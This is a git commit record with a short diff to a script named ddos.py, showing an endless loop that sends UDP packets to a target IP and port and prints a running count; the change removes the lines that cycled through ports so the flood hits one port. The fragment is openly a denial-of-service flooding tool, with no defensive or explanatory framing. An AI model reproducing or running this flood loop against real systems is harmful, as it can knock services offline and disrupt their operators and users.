f29a14725908bef46b3d650e55a967794aa4cce5
Duchenne0080 <64134744+Duchenne0080@users.noreply.github.com>
2020-09-02 11:13:33 +1000

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -35,7 +35,4 @@ port = int(port)
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
-     port = port + 1
      print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
-     if port == 65534:
-       port = 1
